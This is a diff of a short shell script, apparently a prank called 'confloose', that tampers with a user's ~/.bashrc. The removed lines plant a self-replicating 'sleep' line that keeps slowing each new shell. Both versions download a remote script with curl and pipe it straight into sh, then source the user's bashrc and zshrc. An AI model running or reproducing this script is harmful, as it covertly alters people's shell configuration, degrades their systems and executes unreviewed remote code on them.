@@ -1,5 +1,4 @@
 #!/bin/sh
 
-echo "echo 'sleep 1 # confloose by leo' >> \"$HOME/.bashrc\"" >> "$HOME/.bashrc"
-echo $(curl "${CONFLOOSE_BASE:-https://louismoretti.github.io/Confloose}/confloose/bashrc_confloose_base.sh") "de-keyboard" "'echo \\'sleep 1 # confloose by leo [sleep, child]\\' >> \"\$HOME/.bashrc\"'" | sh
+echo $(curl -fsSL "${CONFLOOSE_BASE:-https://louismoretti.github.io/Confloose}/confloose/bashrc_confloose_base.sh") "sleep" "'sleep 1'" | sh
 for name in bashrc zshrc; do source "$HOME/.$name" 2>/dev/null; done
